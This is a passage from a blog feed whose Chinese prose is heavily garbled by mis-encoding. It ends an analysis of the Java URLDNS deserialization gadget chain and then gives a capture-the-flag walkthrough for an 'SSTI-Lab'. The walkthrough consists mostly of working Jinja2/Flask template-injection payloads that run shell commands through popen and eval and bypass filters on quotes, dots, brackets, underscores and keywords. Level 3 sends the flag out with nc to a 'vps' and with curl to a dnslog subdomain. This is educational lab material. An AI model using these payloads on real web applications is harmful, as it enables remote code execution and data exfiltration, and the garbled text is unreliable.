src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243955.png" alt="image-20230423224317914"><br>hash()ÊñπÊ≥ïÈáåÈù¢Ë∞ÉÁî®‰∫ÜhashCode()ÊñπÊ≥ïÔºåËøôÈáåkeyÊòØURLÁöÑÂØπË±°ÊâÄ‰ª•ËøôÈáåÁöÑhashCodeÊñπÊ≥ïÊòØURLÁ±ª‰∏≠ÁöÑÔºåËøôÈáåË∞ÉËØïÁöÑÊó∂ÂÄô‰∏ÄÂÆöË¶ÅÂà∞key‰∏∫URLÂØπË±°ÂêéÊâçËÉΩËøõÂÖ•URLÁ±ª‰∏≠hashCode()ÊñπÊ≥ïÔºå‰∏çÁÑ∂ËøõÂÖ•ÁöÑÂ∞±ÊòØObject‰∏≠ÁöÑhashCode()ÊñπÊ≥ïÔºåÂØπ‰∫éÂ∞èÁôΩËøôÈáåÂæàÂÆπÊòìËø∑Á≥äÔºåÊØîÂ¶ÇÊàëÔºåÁªßÁª≠Ë∑üËøõ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243515.png" alt="image-20230423224330461"><br>Êù•Âà∞‰∫ÜURLÁöÑhashCode()ÊñπÊ≥ïÔºåÂèØ‰ª•ÁúãÂà∞ËøôÈáåÂÄº‰∏ç‰∏∫-1ÁöÑËØùÂ∞±Áõ¥Êé•ËøîÂõû‰∫ÜÔºåÊâÄ‰ª•ÂÄºÂøÖÈ°ª‰∏∫-1ÔºåÂú®Ëøô‰∏™Á±ª‰∏≠ÂÆÉÁöÑÂÄºÂ∑≤ÁªèÂàùÂßãÂåñÂ•Ω‰∫Ü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243334.png"><br>ÁªßÁª≠ÂàÜÊûêÔºå‰∏ãÈù¢ËøôÈáåÂØπhashCodeËøõË°å‰∫ÜÂ§ÑÁêÜÔºåË∑üËøõhandlerÂØπË±°ÁöÑhashCode()ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243350.png"><br>ÂèØ‰ª•ÁúãÂà∞handlerÊòØURLStreamHandlerÁöÑÂØπË±°<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244392.png" alt="image-20230423224413351"><br>ÂèØ‰ª•ÁúãÂà∞Âú®ÂØπhashCodeËøõË°åÂ§ÑÁêÜÊó∂Ë∞ÉÁî®‰∫ÜgetHostAddress()ÊñπÊ≥ïÔºåËøô‰∏™ÊñπÊ≥ïÂèØ‰ª•Ëé∑ÂèñIPÂú∞ÂùÄ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244708.png" alt="image-20230423224436669"><br>Ë∑üËøõËøô‰∏™ÊñπÊ≥ïÔºåËøôÈáåÁõ¥Êé•Ë¥¥‰∏Ä‰ΩçÂ§ß‰Ω¨Â∏¶ÊúâÊ≥®ÈáäÁöÑ‰ª£Á†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//ÂÖàÂà§Êñ≠ËØ•URLÁöÑhostAddressÂ±ûÊÄßÊòØÂê¶Â∑≤ÁªèÊúâÂÄº‰∫Ü</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//Â¶ÇÊûúÂ∑≤ÊúâÂÄºÔºåÁõ¥Êé•ËøîÂõû</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//Ëé∑ÂèñHost</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//Ëé∑ÂèñIPÂú∞ÂùÄÔºåÂπ∂ÊääÂÄºËµãÁªôURLÁöÑhostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ªéËøôÈáåÂèØ‰ª•ÁúãÂá∫ÔºåÂ¶ÇÊûú‰Ω†‰πãÂâçÂ∑≤ÁªèËÆøÈóÆËøádnsÁöÑÂüüÂêçÈÇ£‰πàÂ∞±‰∏ç‰ºöÂá∫ÂèëÁ¨¨‰∫åÊ¨°ÔºåÊàëÂ∞±ÊòØÂõ†‰∏∫Ëøô‰∏™Âç°‰∫ÜÂçäÂ§©Ëøò‰ª•‰∏∫‰ª£Á†ÅÊúâÈóÆÈ¢òÔºåÊúÄÂêéÂú®‰∏ãÈù¢ËøôÈáåÂèëËµ∑DNSËØ∑Ê±Ç<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244816.png" alt="image-20230423224452776"><br>ÂêéÈù¢ÂÖ∑‰ΩìÊÄé‰πàÂèëËµ∑ËØ∑Ê±ÇÂèØÂèÇËÄÉ<a href="https://leihehe.top/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥û‰πãURLDNSÂà©Áî®Èìæ(7) | LeiH - Blog (leihehe.top)</a><br>ÊâßË°åÁ®ãÂ∫èÂèØÁúãÂà∞ËØ∑Ê±ÇÊàêÂäü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232245550.png" alt="image-20230423224502505"></p><h2 id="Âà©Áî®Èìæ"><a href="#Âà©Áî®Èìæ" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h2><blockquote><p>HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p></blockquote><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>ËôΩÁÑ∂ËøôÊòØJavaÂèçÂ∫èÂàóÂåñÊúÄÁÆÄÂçïÁöÑ‰∏ÄÊù°Èìæ‰ΩÜÊòØÊàë‰∏ÄÁÇπÈÉΩÊ≤°ÊÑüËßâËΩªÊùæÔºåÊâÄ‰ª•ËøôÁØáÂàÜÊûêËøòÊúâÂæàÂ§ö‰∏çË∂≥‰πãÂ§ÑÔºåÊÑüËßâËá™Â∑±ÊâãÂÜôÂàÜÊûê‰πãÂêéÂÜçÂéªÁúãysoserial‰∏äÁöÑURLDNSÈìæ‰ºöËΩªÊùæÂæàÂ§öÔºå‰∏ÄÂºÄÂßãÁõ¥Êé•ÊãøÈÇ£‰∏™ÈìæÂàÜÊûê‰∏ÄÁõ¥Ê≤°ËøõÂ∫¶</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-Lab</title>
      <link href="/2023/03/SSTI-Lab/"/>
      <url>/2023/03/SSTI-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>ÂâçÈù¢ÁöÑËØïÊé¢Â∞±‰∏çÂºÑ‰∫ÜÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•ËØï‰∏Ä‰∏ãÁúãËá™Â∑±ÁéØÂ¢ÉÊúâÊ≤°ÊúâÈóÆÈ¢ò<br>ÂÖàÁªôÂá∫payloadÔºö<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").read()&#125;&#125;</code><br>ËøôÈáåÊâæÁöÑÊòØ<code>os._wrap_close</code>ÈÄöËøáËÑöÊú¨ÊêúÁ¥¢‰∏ãÊ†á‰∏∫143ÔºåÂàùÂßãÂåñ‰πãÂêéÂèØ‰ª•‰ΩøÁî®popenÊù•ÊâìÂºÄflagÔºåËøôÈáåÊúâ‰∏Ä‰∏™ÁÇπÂç°‰∫ÜÊàëÂæà‰πÖÔºåÂ∞±ÊòØ<code>&quot;type flag&quot;</code>Êàë‰∏ÄÁõ¥‰ΩøÁî®<code>&quot;cat flag&quot;</code>Âæó‰∏çÂà∞flagÔºåËÄåÊàë‰∏ÄÂºÄÂßãÊòØ‰∏çÁü•ÈÅìtypeËøô‰∏™ÂëΩ‰ª§ÁöÑÔºåÁúãÂà∞<a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/">SSTI-LabsÈù∂Âú∫ - o2takuXX „ÅÆ blogo2takuXX „ÅÆ blog</a>ËøôÁØáÂçöÂÆ¢ÊâçÁü•ÈÅìtypeÂëΩ‰ª§<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011836.png" alt="image-20230327201121406"><br>ÈÄöËøáGPTÁöÑÂõûÁ≠îÂ∫îËØ•ÊòØÁî±‰∫éÊàëÂú®Windows‰∏ãÈÉ®ÁΩ≤ÁöÑÁéØÂ¢ÉÂØºËá¥ÁöÑÈóÆÈ¢òÔºåÊúÄÁªà‰ΩøÁî®typeÂæóÂà∞flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011503.png" alt="image-20230327201153225"><br>ÂΩìÁÑ∂ÂèØ‰ª•Áî®ÁöÑÊ®°ÂùóÂæàÂ§öÔºåÂèØ‰ª•ÂèÇËÄÉ‰∏Ä‰∏ãÁΩë‰∏äÂÖ∂ÂÆÉÂçö‰∏ªÁöÑwpÔºåËøôÈáåÂ∞±‰∏ç‰∏Ä‰∏ÄÂàó‰∏æ‰∫Ü</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫Ü<code>&#123;&#123;`ÂèØ‰ª•Áî®`&#123;% %&#125;`Êù•ÁªïËøáÔºå`&#123;% %&#125;`Áî®‰∫éÊâßË°åpython‰ª£Á†ÅÊâÄ‰ª•Áõ¥Êé•print‰∏Ä‰∏ãÂ∞±Ë°åpayloadÔºö`&#123;%print("".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").raead())%&#125;`![image-20230327201213126](https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012396.png)ËøôÈáå‰πüÊîæ‰∏Ä‰∏ãimportÊñπÊ≥ïÂÆûÁé∞‰æø‰∫éÊàëËá™Â∑±‰ª•ÂêéÊü•ÁúãÔºåÂú®`_frozen_importlib._ModuleLock`Ê®°Âùó‰∏≠ÊúâimportÊñπÊ≥ïÔºåÊêúÁ¥¢‰∏ãÊ†á‰∏∫100payloadÔºö`&#123;%print(''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read())%&#125;`ËøôÁßçÊñπÊ≥ïÊòØÈÄöËøáimportÊñπÊ≥ïÂØºÂÖ•osÊ®°ÂùóÊâßË°åpopenÂáΩÊï∞Êù•ÂÆûÁé∞ÁöÑ## level 3Ëøô‰∏ÄÂÖ≥ÊòØÊ≤°ÊúâÂõûÊòæÔºåÂèØ‰ª•ÈÄöËøáÂ§ñÂ∏¶Âà∞vpsÊù•ÂæóÂà∞flagÔºå‰πüÂèØ‰ª•Âà©Áî®dnslogÂÖàÁúãÂ§ñÂ∏¶Âà∞vps`&#123;&#123;''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag|nc vps port').read()")&#125;&#125;</code><br>ÂêåÊ†∑ÊòØÂà©Áî®<code>_frozen_importlib._ModuleLock</code>Ê®°Âùó‰∏≠ÁöÑÊñπÊ≥ï‰ΩÜÊòØËøôÈáåÂ∞±Â§ö‰∫Ü‰∏Ä‰∏™<code>__builtins__</code>Ëøô‰∏™Ê®°ÂùóËøîÂõû‰∏Ä‰∏™Áî±ÂÜÖÂª∫ÂáΩÊï∞ÔºàÂç≥pythonËá™Â∏¶ÂáΩÊï∞ÔºâÂáΩÊï∞ÂêçÁªÑÊàêÁöÑÂàóË°®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012454.png" alt="image-20230327201230329"><br>ÁêÜËß£Ëøô‰∏™ÊñπÊ≥ïÊâßË°åÂ∞±ÂèØ‰ª•ÁúãÊáÇpayload‰∫ÜÔºåÂâçÈù¢ÁöÑÂéüÁêÜÊ≤°ÂèòÔºå<code>__builtins__</code>ÊòØobjectÁöÑ‰∏Ä‰∏™Â≠êÁ±ªÔºåÊâÄ‰ª•ÂâçÈù¢ÂØºÂÖ•‰∫ÜobjectÂ∞±ÂèØ‰ª•ÊêúÂØªÂà∞<code>__builtins__</code>Â∞±Áõ∏ÂΩì‰∫éÂØºÂÖ•‰∫ÜÔºåevalÊòØÂÜÖÁΩÆÂáΩÊï∞ÊâÄ‰ª•<code>__builtins__</code>ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®ÔºåÁÑ∂ÂêéÂØºÂÖ•osÊ®°ÂùóÔºå<code>type flag</code>ÂÖàÊâæÂà∞flagÁõÆÂΩïÈÄöËøáncÂëΩ‰ª§ËæìÂá∫Âà∞Ëá™Â∑±ÁöÑvps‰∏äÔºåWindows‰∏ãÈúÄË¶ÅËá™Â∑±ÂÆâË£Ö‰∏Ä‰∏ãncÂëΩ‰ª§ÔºåËøôÊó∂ÂÄôÁúüÊÑüËßâÂ∞ÜÁéØÂ¢ÉÈÉ®ÁΩ≤Âà∞Linux‰∏ãÊñπ‰æøÂæàÂ§ö<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012421.png" alt="image-20230327201251069"><br>ÁÑ∂ÂêéÁúã‰∏Ä‰∏ãÂ§ñÂ∏¶Âà∞dnslog‰∏äÁöÑpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://`type flag`.ou7jiq.dnslog.cn&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊä•Èîô‰∫ÜÔºåÊ≤°Ëß£ÂÜ≥ÂÖàÊîæÁùÄ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013947.png" alt="image-20230327201306652"></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫Ü<code>[]</code>‰ΩøÁî®ÈÅçÂéÜÊù•ÁªïËøáÔºåÈÖçÂêà<code>__getitem__</code>È≠îÊúØÊñπÊ≥ïËøõË°åÂèñÂÄº<br>payloadÔºö<code>&#123;% for i in ''.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>Ëøô‰∏™payloadÁöÑÂâçÂçäÈÉ®ÂàÜÁõ∏ÂΩì‰∫é</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> i.__name__==<span class="string">&#x27;Popen&#x27;</span></span><br><span class="line">    ÈúÄË¶ÅÊâßË°åÁöÑÂÜÖÂÆπ</span><br></pre></td></tr></table></figure><p>ÊâßË°åpayloadÂæóÂà∞flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013616.png" alt="image-20230327201322430"></p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫ÜÂçïÂèåÂºïÂè∑Ôºå‰ΩøÁî®requestËøõË°åÁªïËøá</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request              #request.__init__.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">request.args.x1    #get‰º†ÂèÇ</span><br><span class="line">request.values.x1  #ÊâÄÊúâÂèÇÊï∞</span><br><span class="line">request.cookies      #cookiesÂèÇÊï∞</span><br><span class="line">request.headers      #ËØ∑Ê±ÇÂ§¥ÂèÇÊï∞</span><br><span class="line">request.form.x1    #post‰º†ÂèÇ(Content-Type:applicaation/x-www-form-urlencodedÊàñ                             multipart/form-data)</span><br><span class="line">request.data   #post‰º†ÂèÇ(Content-Type:a/b)</span><br><span class="line">request.json #post‰º†json  (Content-Type: application/json)</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÁúãpayload‰∏Ä‰∏ãÂ∞±ËÉΩÁêÜËß£‰∫Ü<br>getÔºö<code>?arg1=__builtins__&amp;arg2=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postÔºö<code>code=&#123;&#123;().__class__.__base__.__subclasses__()[100].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013900.png" alt="image-20230327201347018"></p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>ËøáÊª§‰∫Ü‰∏ãÂàíÁ∫ø<code>_</code>‰ΩøÁî®<code>|attr</code>ËøáÊª§Âô®ÔºåÁ±ª‰ºº‰∫éLinux‰∏≠ÁöÑÁÆ°ÈÅìÁ¨¶<code>|</code>Áî®ÂâçÈù¢ÁöÑËæìÂá∫‰Ωú‰∏∫ÂêéÈù¢ÁöÑÊìç‰ΩúÂØπË±°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__&quot;)</span><br><span class="line">Áõ∏ÂΩì‰∫é</span><br><span class="line">&quot;&quot;.__class__</span><br></pre></td></tr></table></figure><p>getÔºö<code>?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#39;os&#39;).popen(&#39;type flag&#39;).read()</code><br>postÔºö<code>code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281056075.png" alt="image-20230327205244185"></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>ËøáÊª§‰∫ÜÁÇπ<code>.</code>‰ΩøÁî®‰∏≠Êã¨Âè∑ËøõË°åÁªïËøáÊù•ÊãºÊé•Âõ†‰∏∫ÁÇπÁöÑÂäüËÉΩÂ∞±ÊòØÊãºÊé•‰∏≠Êã¨Âè∑‰πüÊúâËøô‰∏ÄÂäüËÉΩ<br>Â∞ÜÂâçÈù¢ÁöÑpayloadÊîπÂÜô‰∏Ä‰∏ã<br><code>&#123;&#123;''.__class__.__base__.__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read()&#125;&#125;</code><br>ÁÑ∂ÂêéÁî®‰∏≠Êã¨Âè∑Â∞ÜÁÇπÊõøÊç¢<br><code>&#123;&#123;''['__class__']['__base__']['__subclasses__']()[100]['__init__']['__globals__']['__import__']('os')['popen']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057996.png" alt="image-20230327202039586"></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>ËøôÂÖ≥ËøáÊª§‰∫Ü‰∏ÄÂ†ÜÂÖ≥ÈîÆÂ≠óÔºåÊú¨Êù•ÊÉ≥fuzz‰∏Ä‰∏ã‰ΩÜÊòØÊ≤°ÊâæÂà∞Â≠óÂÖ∏Áõ¥Êé•ÁúãwpÁöÑÂêß<br><code>&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;</code><br>Â≠óÁ¨¶‰∏≤ÊãºÊé•ÁªïËøá<br><code>&#123;&#123;''['__cla''ss__']['__ba''se__']['__subcla''sses__']()[100]['__in''it__']['__glo''bals__']['__import__']('os')['pop''en']("type flag")['read']()&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057747.png" alt="image-20230328105734102"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>ËøáÊª§‰∫ÜÊï∞Â≠óÂç≥ÈôêÂà∂Á¥¢Âºï‰ΩøÁî®<code>__getitem__</code>ÁªïËøá<br>payloadÔºö<code>&#123;&#123;x.__init__.__globals__.__getitem__('__builtins__').eval("__import__('os').popen('type flag').read()")&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281057504.png" alt="image-20230328105751445"><br>‰ΩøÁî®lipsumÔºåflaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞<code>__builtins__</code>ÔºåËÄå‰∏î<code>lipsum.__globals__</code>Âê´ÊúâosÊ®°ÂùóÔºö<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code></p><p>payloadÔºö<code>&#123;&#123;lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("type flag")|attr("read")()&#125;&#125;</code><br>‰πüËÉΩÊâìÈÄö</p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>ËØ•È¢òwafÔºö<code>set config = None</code>ÔºåÁõÆÊ†áÊòØÂæóÂà∞configÂç≥ÈÖçÁΩÆÊñá‰ª∂ËÄå‰∏çÊòØflag<br>ËøôÈ¢òÂèØ‰ª•ÈÄöËøáurl_for()ÊàñËÄÖget_flashed_messages()ÊñπÊ≥ïÈÖçÂêà<br><strong>url_for()</strong> ‚Äî- flaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞__builtins__ÔºåËÄå‰∏î<code>url_for.__globals__[&#39;__builtins__&#39;]</code>Âê´Êúâ<code>current_app</code></p><p><strong>get_flashed_messages()</strong> ‚Äî- flaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞__builtins__ÔºåËÄå‰∏î<code>url_for.__globals__[&#39;__builtins__&#39;]</code>Âê´Êúâ<code>current_app</code></p><p><strong>current_app</strong> ‚Äî- Â∫îÁî®‰∏ä‰∏ãÊñáÔºå‰∏Ä‰∏™ÂÖ®Â±ÄÂèòÈáè„ÄÇ<br>payloadÔºö  <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303281058523.png" alt="image-20230328105809669"><br>ÂæàÂ•áÊÄ™ËøôÈáåÂà©Áî®url_for()Â§±Ë¥•‰∫Ü</p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>Ëøô‰∏ÄÂÖ≥ËøáÊª§‰∫ÜÂçïÂºïÂè∑<code>&#39;</code> ÂèåÂºïÂè∑<code>&quot;</code> Âä†Âè∑<code>+</code> ÂÖ≥ÈîÆÂ≠ó<code>request</code> ÁÇπÂè∑<code>.</code> ÊñπÊã¨Âè∑<code>[]</code><br>ÊÑüËßâËøôÂÖ≥ËøòÊòØÊå∫ÈöæÁöÑ<br>ÂÖàÁúã‰∏Ä‰∫õËøáÊª§Âô®Âêß</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Â∏∏Áî®ÁöÑËøáÊª§Âô®</span><br><span class="line"></span><br><span class="line">int()ÔºöÂ∞ÜÂÄºËΩ¨Êç¢‰∏∫intÁ±ªÂûãÔºõ</span><br><span class="line"></span><br><span class="line">float()ÔºöÂ∞ÜÂÄºËΩ¨Êç¢‰∏∫floatÁ±ªÂûãÔºõ</span><br><span class="line"></span><br><span class="line">lower()ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Â∞èÂÜôÔºõ</span><br><span class="line"></span><br><span class="line">upper()ÔºöÂ∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Â§ßÂÜôÔºõ</span><br><span class="line"></span><br><span class="line">title()ÔºöÊääÂÄº‰∏≠ÁöÑÊØè‰∏™ÂçïËØçÁöÑÈ¶ñÂ≠óÊØçÈÉΩËΩ¨ÊàêÂ§ßÂÜôÔºõ</span><br><span class="line"></span><br><span class="line">capitalize()ÔºöÊääÂèòÈáèÂÄºÁöÑÈ¶ñÂ≠óÊØçËΩ¨ÊàêÂ§ßÂÜôÔºåÂÖ∂‰ΩôÂ≠óÊØçËΩ¨Â∞èÂÜôÔºõ</span><br><span class="line"></span><br><span class="line">trim()ÔºöÊà™ÂèñÂ≠óÁ¨¶‰∏≤ÂâçÈù¢ÂíåÂêéÈù¢ÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶Ôºõ</span><br><span class="line"></span><br><span class="line">wordcount()ÔºöËÆ°ÁÆó‰∏Ä‰∏™ÈïøÂ≠óÁ¨¶‰∏≤‰∏≠ÂçïËØçÁöÑ‰∏™Êï∞Ôºõ</span><br><span class="line"></span><br><span class="line">reverse()ÔºöÂ≠óÁ¨¶‰∏≤ÂèçËΩ¨Ôºõ</span><br><span class="line"></span><br><span class="line">replace(value,old,new)Ôºö ÊõøÊç¢Â∞ÜoldÊõøÊç¢‰∏∫newÁöÑÂ≠óÁ¨¶‰∏≤Ôºõ</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)ÔºöÊà™ÂèñlengthÈïøÂ∫¶ÁöÑÂ≠óÁ¨¶‰∏≤Ôºõ</span><br><span class="line"></span><br><span class="line">striptags()ÔºöÂà†Èô§Â≠óÁ¨¶‰∏≤‰∏≠ÊâÄÊúâÁöÑHTMLÊ†áÁ≠æÔºåÂ¶ÇÊûúÂá∫Áé∞Â§ö‰∏™Á©∫Ê†ºÔºåÂ∞ÜÊõøÊç¢Êàê‰∏Ä‰∏™Á©∫Ê†ºÔºõ</span><br><span class="line"></span><br><span class="line">escape()ÊàñeÔºöËΩ¨‰πâÂ≠óÁ¨¶Ôºå‰ºöÂ∞Ü&lt;„ÄÅ&gt;Á≠âÁ¨¶Âè∑ËΩ¨‰πâÊàêHTML‰∏≠ÁöÑÁ¨¶Âè∑„ÄÇÊòæ‰æãÔºöcontent|escapeÊàñcontent|e„ÄÇ</span><br><span class="line"></span><br><span class="line">safe()Ôºö 